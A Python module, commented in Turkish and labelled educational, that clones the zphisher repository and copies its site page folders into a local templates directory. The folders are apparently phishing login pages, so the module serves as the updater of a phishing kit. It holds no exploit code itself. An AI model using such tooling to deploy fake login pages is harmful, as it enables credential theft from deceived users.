# -*- coding: utf-8 -*-
# =============================================================================
# modules/updater.py — Şablon Güncelleyici
# =============================================================================
# KESİNLİKLE EĞİTİM AMAÇLIDIR
# =============================================================================

import os
import sys
import time
import json
import shutil
import subprocess
from pathlib import Path
from typing import Optional, Tuple, List


class Guncelleyici:
    def __init__(self, kok_dizin: Optional[Path] = None):
        self.kok = kok_dizin or Path(__file__).parent.parent
        self.cache_dir = self.kok / ".templates_cache"
        self.templates_dir = self.kok / "templates"
        self.fallback_dir = self.kok / "templates" / "fallback"
        self.versiyon_dosyasi = self.kok / ".versiyon.json"

    def versiyon_oku(self) -> dict:
        try:
            if self.versiyon_dosyasi.exists():
                with open(self.versiyon_dosyasi, "r", encoding="utf-8") as f:
                    return json.load(f)
        except Exception:
            pass
        return {"versiyon": "bilinmiyor", "guncelleme_zamani": "?"}

    def versiyon_yaz(self, versiyon: str):
        veri = {
            "versiyon": versiyon,
            "guncelleme_zamani": time.strftime("%Y-%m-%d %H:%M:%S"),
        }
        with open(self.versiyon_dosyasi, "w", encoding="utf-8") as f:
            json.dump(veri, f, indent=2, ensure_ascii=False)

    def git_mevcut_mu(self) -> bool:
        return shutil.which("git") is not None

    def cache_guncelle(self) -> bool:
        """Zphisher cache'i git pull veya yeniden klonla günceller."""
        if not self.git_mevcut_mu():
            print("[!] git bulunamadı!")
            return False

        if not self.cache_dir.exists():
            print("[i] Cache yok, yeniden klonlanıyor...")
            return self._yeniden_klonla()

        # git repo mu?
        if (self.cache_dir / ".git").exists():
            print("[i] git pull deneniyor...")
            try:
                r = subprocess.run(
                    ["git", "-C", str(self.cache_dir), "pull", "--depth=1"],
                    capture_output=True, text=True, timeout=120
                )
                if r.returncode == 0:
                    print(f"[+] Güncellendi: {r.stdout.strip()[:200]}")
                    self.versiyon_yaz(time.strftime("%Y%m%d%H%M%S"))
                    return True
                else:
                    print(f"[!] git pull başarısız: {r.stderr.strip()[:200]}")
                    print("[i] Yeniden klonlanıyor...")
                    return self._yeniden_klonla()
            except Exception as e:
                print(f"[!] git pull hatası: {e}")
                return self._yeniden_klonla()
        else:
            print("[i] git repo değil, yeniden klonlanıyor...")
            return self._yeniden_klonla()

    def _yeniden_klonla(self) -> bool:
        try:
            if self.cache_dir.exists():
                shutil.rmtree(self.cache_dir, ignore_errors=True)
            r = subprocess.run(
                ["git", "clone", "--depth=1",
                 "https://github.com/htr-tech/zphisher.git",
                 str(self.cache_dir)],
                capture_output=True, text=True, timeout=180
            )
            if r.returncode == 0:
                print("[+] Yeniden klonlandı.")
                self.versiyon_yaz(time.strftime("%Y%m%d%H%M%S"))
                return True
            print(f"[!] Klonlama hatası: {r.stderr.strip()[:200]}")
            return False
        except Exception as e:
            print(f"[!] Klonlama istisnası: {e}")
            return False

    def templates_guncelle(self) -> bool:
        """templates/ klasörünü cache'den yeniden kopyalar."""
        zph_pages = self.cache_dir / ".github" / "pages"
        if not zph_pages.exists():
            print("[!] Cache'de .github/pages yok!")
            return False

        # templates/ içine kopyala (fallback hariç)
        self.templates_dir.mkdir(exist_ok=True)
        sayac = 0
        for site_dir in zph_pages.iterdir():
            if not site_dir.is_dir():
                continue
            hedef = self.templates_dir / site_dir.name
            try:
                if hedef.exists():
                    shutil.rmtree(hedef)
                shutil.copytree(site_dir, hedef)
                sayac += 1
            except Exception as e:
                print(f"[!] {site_dir.name} kopyalanamadı: {e}")

        print(f"[+] {sayac} şablon güncellendi.")
        return True

    def istatistik(self) -> dict:
        zph_pages = self.cache_dir / ".github" / "pages"
        templates = list(self.templates_dir.glob("*/")) if self.templates_dir.exists() else []
        fallback = list(self.fallback_dir.glob("*/")) if self.fallback_dir.exists() else []
        return {
            "versiyon": self.versiyon_oku(),
            "cache_pages": len(list(zph_pages.iterdir())) if zph_pages.exists() else 0,
            "templates": len(templates),
            "fallback": len(fallback),
        }


def updater_menusu():
    g = Guncelleyici()
    while True:
        print()
        print("╔══════════════════════════════════════════════╗")
        print("║          Şablon Güncelleyici                 ║")
        print("║          KESİNLİKLE EĞİTİM AMAÇLIDIR        ║")
        print("╚══════════════════════════════════════════════╝")
        print()
        print("  [1] Versiyon bilgisi")
        print("  [2] Cache güncelle (git pull)")
        print("  [3] Templates yeniden kopyala")
        print("  [4] Tam güncelleme")
        print("  [0] Geri")
        print()
        try:
            s = input("Seçim: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if s == "0":
            return
        elif s == "1":
            st = g.istatistik()
            for k, v in st.items():
                print(f"  {k}: {v}")
        elif s == "2":
            g.cache_guncelle()
        elif s == "3":
            g.templates_guncelle()
        elif s == "4":
            if g.cache_guncelle():
                g.templates_guncelle()
                st = g.istatistik()
                print(f"[+] Tamamlandı. Templates: {st['templates']}")


if __name__ == "__main__":
    updater_menusu()
